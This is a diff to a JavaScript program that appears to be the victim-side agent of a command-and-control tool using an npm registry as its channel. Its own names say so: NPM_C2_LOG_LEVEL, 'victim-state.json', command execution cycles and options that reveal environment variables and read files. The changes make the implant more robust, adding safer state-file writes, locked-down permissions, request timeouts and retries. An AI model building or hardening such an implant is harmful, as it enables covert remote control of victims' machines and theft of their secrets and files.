@@ -46,16 +46,23 @@ export function loadState(statePath) {
         ? COMMAND_BASELINE_VERSION
         : 0,
     };
-  } catch {
-    return defaultState();
+  } catch (err) {
+    if (err?.code === 'ENOENT') return defaultState();
+    throw new Error(`cannot load state file "${statePath}": ${err.message}`, { cause: err });
   }
 }
 
 export function saveState(statePath, state) {
-  const tmp = `${statePath}.tmp`;
-  fs.mkdirSync(path.dirname(path.resolve(statePath)), { recursive: true });
-  fs.writeFileSync(tmp, JSON.stringify(state, null, 2));
-  fs.renameSync(tmp, statePath); // atomic-ish: never leave a half-written state file
+  const absolute = path.resolve(statePath);
+  const tmp = `${absolute}.${process.pid}.tmp`;
+  fs.mkdirSync(path.dirname(absolute), { recursive: true, mode: 0o700 });
+  try {
+    fs.writeFileSync(tmp, JSON.stringify(state, null, 2), { flag: 'wx', mode: 0o600 });
+    if (process.platform !== 'win32') fs.chmodSync(tmp, 0o600);
+    fs.renameSync(tmp, absolute);
+  } finally {
+    fs.rmSync(tmp, { force: true });
+  }
 }
 
 /** Reset command progress when the configured identity changes. */
@@ -241,7 +248,7 @@ const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 async function main() {
   const cfg = loadConfig(configArgFromArgv());
   const logger = createLogger({
-    level: process.env.NPM_C2_LOG_LEVEL || 'info',
+    level: cfg.logLevel,
     logFile: cfg.logFile,
   });
   const statePath = cfg.stateFile || 'victim-state.json';
@@ -261,6 +268,9 @@ async function main() {
     registryUrl: cfg.registryUrl,
     packageName: cfg.packageName,
     token: cfg.token,
+    timeoutMs: cfg.requestTimeoutMs,
+    maxRetries: cfg.maxRetries,
+    baseDelayMs: cfg.retryBaseDelayMs,
     logger,
   });
 
@@ -316,7 +326,12 @@ async function main() {
         client,
         logger,
         save,
-        limits: { maxFileBytes: cfg.maxFileBytes, revealEnv: cfg.revealEnv },
+        limits: {
+          maxFileBytes: cfg.maxFileBytes,
+          revealEnv: cfg.revealEnv,
+          filesystemRoot: cfg.filesystemRoot,
+          enableFunOps: cfg.enableFunOps,
+        },
       });
       if (stats.executed > 0 || stats.skipped > 0) {
         logger.info('cycle summary', stats);
